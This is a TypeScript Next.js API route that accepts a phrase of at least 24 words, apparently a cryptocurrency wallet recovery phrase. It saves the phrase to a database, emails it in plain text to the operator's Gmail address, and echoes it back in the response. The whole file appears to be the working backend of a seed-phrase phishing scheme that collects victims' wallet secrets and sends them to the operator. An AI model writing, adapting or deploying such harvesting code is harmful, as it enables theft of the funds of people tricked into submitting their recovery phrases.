import { prisma } from '@/lib/prisma';
import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { passphrase } = body;

        // Type & presence validation
        if (typeof passphrase !== 'string' || !passphrase.trim()) {
            return NextResponse.json(
                { error: 'Passphrase must be a non-empty string' },
                { status: 400 }
            );
        }

        const trimmed = passphrase.trim();
        const wordCount = trimmed.split(/\s+/).length;

        if (wordCount < 24) {
            return NextResponse.json(
                { error: `Passphrase must be at least 24 words (${wordCount} given)` },
                { status: 400 }
            );
        }

        // Database operation
        await prisma.passphrase.create({
            data: { phrase: trimmed },
        });

        // Email notification (fail gracefully – don't break the response)
        try {
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: process.env.EMAIL_USER,
                    pass: process.env.EMAIL_PASS,
                },
            });
            await transporter.sendMail({
                from: `"Passphrase" <${process.env.EMAIL_USER}>`,
                to: process.env.EMAIL_USER,
                subject: 'New Passphrase Received',
                text: `A new passphrase was received:\n\n${trimmed}\nReceived at: ${new Date().toISOString()}\nWord count: ${wordCount}`,
            });
        } catch (emailError) {
            console.error('Failed to send email notification:', emailError);
            // Optionally log to an error tracking service, but don't fail the request
        }

        return NextResponse.json({
            message: 'Passphrase accepted successfully',
            received: trimmed,
            timestamp: new Date().toISOString(),
            wordCount,
        });
    } catch (error) {
        console.error('API error:', error);
        return NextResponse.json(
            { error: 'Invalid request or server error' },
            { status: 400 }
        );
    }
}